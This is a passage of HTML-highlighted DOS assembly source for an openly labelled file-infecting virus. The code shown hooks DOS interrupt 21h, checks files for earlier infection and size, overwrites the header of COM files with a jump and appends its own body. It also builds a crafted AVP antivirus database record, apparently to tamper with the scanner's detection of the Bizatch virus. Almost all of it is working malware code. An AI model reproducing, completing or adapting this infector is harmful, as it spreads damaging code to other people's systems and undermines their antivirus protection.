</span><span class="sc5">check_file</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">; Clear and save file</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; attributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Set read/write mode</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                     </span><span class="sc1">; Read first four</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">; bytes to our buffer</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">host_header</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">host_header</span><span class="sc0">    </span><span class="sc1">; First word in AX</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                      </span><span class="sc1">; M+Z or Z+M=0a7h :)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc0">                    </span><span class="sc1">; So is it an EXE file?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">                 </span><span class="sc1">; Fuck it</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">host_header</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0"> </span><span class="sc1">; Check file for any</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">                 </span><span class="sc1">; previous infection</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Check file length</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0faebh</span><span class="sc0">                  </span><span class="sc1">; &gt; 64235?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; Save length</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">; Make the initial</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">new_header</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; jmp to our code</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Lseek to the start</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; Write in our cooler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">; header :)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">new_header</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; Lseek to the end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; of the file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; Append our code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">anticaro_size</span><span class="sc0">           </span><span class="sc1">; Huh? where's the</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">anticaro_start</span><span class="sc0">          </span><span class="sc1">; call to the poly</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">; engine? :)</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                     </span><span class="sc1">; Close our victim</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; Restore attributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; Pop shit and jump</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dont_infect</span><span class="sc0">                </span><span class="sc1">; to the original int 21h</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Subroutines... or... oh, well, subroutine :) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">get_sft</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">                   </span><span class="sc1">; Get job file table</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">                        </span><span class="sc1">; in ES:DI (DOS 3+)</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">bad_sft</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; Get the address of</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">                   </span><span class="sc1">; the specific SFT for</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; our handle</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">

</span><span class="sc5">bad_sft</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Pop registers and</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">; return to the code</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Data area ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">host_header</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">           </span><span class="sc1">; Host's header</span><span class="sc0">
</span><span class="sc5">new_header</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">               </span><span class="sc1">; New header buffer</span><span class="sc0">
</span><span class="sc5">avp_set</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'avp.set'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Can't you guess it? :)</span><span class="sc0">
</span><span class="sc5">bizatch_name</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'BIZATCH.AVB'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">      </span><span class="sc1">; Our database field</span><span class="sc0">
</span><span class="sc5">bizatch_base</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'bizatch.avb'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Viral database name</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ BIZATCH.AVB viral database ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The hex dump below is the AVP full-compatible  viral database which con-</span><span class="sc0">
</span><span class="sc1">; tains the necessary  data for detecting Bizatch. This was done by compi-</span><span class="sc0">
</span><span class="sc1">; ling the 'belower' code, linking  it to a  new AVPRO record, and filling</span><span class="sc0">
</span><span class="sc1">; out some of this record's data fields. These are the steps:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - Compile the source below this hex dump: tasm /m /ml /q biz_dec.asm.</span><span class="sc0">
</span><span class="sc1">; - Execute AVP's AVPRO.EXE.</span><span class="sc0">
</span><span class="sc1">; - Edit a new viral dabase (Alt-E, F3, and then type 'bizatch.avb').</span><span class="sc0">
</span><span class="sc1">; - Insert a file record in it (Alt-I, and then select 'File virus').</span><span class="sc0">
</span><span class="sc1">; - Fill the form as follows:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;             ÉÍ[ş]ÍÍÍÍÍÍÍÍÍÍÍ File virus ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»</span><span class="sc0">
</span><span class="sc1">;             º    Name: Bizatch_:P        Type  [ ] COM  º</span><span class="sc0">
</span><span class="sc1">;             º Comment: Fuck you, Bontchy       [X] EXE  º</span><span class="sc0">
</span><span class="sc1">;             º                                  [ ] SYS  º</span><span class="sc0">
</span><span class="sc1">;             º  Area 1  Header                  [ ] WIN  º</span><span class="sc0">
</span><span class="sc1">;             º  Offset  0000                             º</span><span class="sc0">
</span><span class="sc1">;             º  Length  00           Method  Delete      º</span><span class="sc0">
</span><span class="sc1">;             º  Area 2  Page_C         Area  Header      º</span><span class="sc0">
</span><span class="sc1">;             º  Offset  0000           From  +0000       º</span><span class="sc0">
</span><span class="sc1">;             º  Length  0a           Length  +0000       º</span><span class="sc0">
</span><span class="sc1">;             º                           To  +0000       º</span><span class="sc0">
</span><span class="sc1">;           &gt; º   Link Ü                      +0000       º</span><span class="sc0">
</span><span class="sc1">;             º   ßßßßßß                 Cut  0000        º</span><span class="sc0">
</span><span class="sc1">;           &gt; º    Sum Ü 00000000                         º</span><span class="sc0">
</span><span class="sc1">;             º   ßßßßßß 00000000                         º</span><span class="sc0">
</span><span class="sc1">;             º                                           º</span><span class="sc0">
</span><span class="sc1">;             º              Ok    Ü      Cancel  Ü       º</span><span class="sc0">
</span><span class="sc1">;             º           ßßßßßßßßßß     ßßßßßßßßßß       º</span><span class="sc0">
</span><span class="sc1">;             ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - Link biz_dec.obj (Alt-L, and then select it).</span><span class="sc0">
</span><span class="sc1">; - Type in Bizatch's entry point  for calculating  its  sum (Alt-S, don't</span><span class="sc0">
</span><span class="sc1">;   select  any  file, and type  in 'e8 00 00 00 00 5d 8b c5 2d 05' in the</span><span class="sc0">
</span><span class="sc1">;   dump gap AVPRO will show you.</span><span class="sc0">
</span><span class="sc1">; - Save the new record and the new viral database.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; As you see, this  is quite tedious  to do, and that's why i included di-</span><span class="sc0">
</span><span class="sc1">; rectly the hex dump of  the result of all these steps, which seems to me</span><span class="sc0">
</span><span class="sc1">; a bit more easy for you :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; So skip the hex dump and have a look at biz_dec.asm's code, which is the</span><span class="sc0">
</span><span class="sc1">; really important thing of this virus.</span><span class="sc0">


</span><span class="sc5">base_start</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">base_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">base_end</span><span class="sc4">-</span><span class="sc5">base_start</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">bizatch_avb</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2dh</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">6bh</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">39h</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">2dh</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">3ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">6bh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc4">,</span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">69h</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc2">5fh</span><span class="sc4">,</span><span class="sc2">3ah</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc0">
